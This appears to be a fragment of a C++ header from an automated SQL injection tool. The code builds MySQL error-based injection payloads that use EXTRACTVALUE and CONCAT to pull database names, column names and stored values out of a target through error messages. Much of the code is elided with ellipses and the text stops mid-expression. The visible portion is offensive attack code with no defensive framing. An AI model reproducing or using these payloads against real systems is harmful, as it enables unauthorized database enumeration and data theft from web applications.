#ifndef MYSQL_ERROR_BASED
#define MYSQL_ERROR_BASED
...
struct mysql_error_based
{
        static std::string payload(sptr_vector& config, const uint8& type)
        {
                ...
                *config[ERROR_BASED_INDEX] = std::to_string(index + 1);
                ...
                {
                case DATABASES:
                        return "' OR 1=EXTRACTVALUE(1, CONCAT(0x7e,("
                               "SELECT schema_name "
                ...
                case COLUMNS:
                        return "' OR 1=EXTRACTVALUE(1, CONCAT(0x7e,("
                               ...
                               *config[ERROR_BASED_TABLE] + "' " +
                               ...
                               index_str + ")))-- ";
                case VALUES:
                        return "' OR 1=EXTRACTVALUE(1, CONCAT(0x7e,(SELECT " +
